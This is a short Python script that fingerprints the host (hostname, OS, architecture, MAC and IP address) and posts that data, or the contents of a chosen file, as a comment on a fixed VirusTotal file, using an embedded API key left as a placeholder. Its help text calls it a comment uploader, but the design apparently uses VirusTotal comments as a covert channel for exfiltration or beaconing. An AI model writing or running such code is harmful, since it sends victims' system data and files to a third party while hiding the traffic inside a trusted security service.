import os
import platform
import socket
import uuid
import requests
import json
import argparse

VT_API_KEY = "[嵌入API的KEY值]"
FILE_ID = "[唯一指定文件ID]"

def get_system_info():
    system_info = {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
        "ip_address": socket.gethostbyname(socket.gethostname())
    }
    return json.dumps(system_info)

def upload_comment(comment):
    url = f"https://www.virustotal.com/api/v3/files/{FILE_ID}/comments"
    headers = {
        "x-apikey": VT_API_KEY,
        "Content-Type": "application/json"
    }
    data = {
        "data": {
            "type": "comment",
            "attributes": {
                "text": comment
            }
        }
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    if response.status_code == 200:
        print("Community posted successfully.")
    else:
        print(f"Failed to post Community: {response.status_code}")

def main():
    parser = argparse.ArgumentParser(description='Upload comments to VirusTotal.')
    parser.add_argument('-f', '--file', help='File containing comment to upload')
    args = parser.parse_args()

    if args.file:
        try:
            with open(args.file, 'r') as file:
                comment = file.read()
        except Exception as e:
            print(f"Error reading file: {e}")
            return
    else:
        comment = get_system_info()

    upload_comment(comment)

if __name__ == "__main__":
    main()
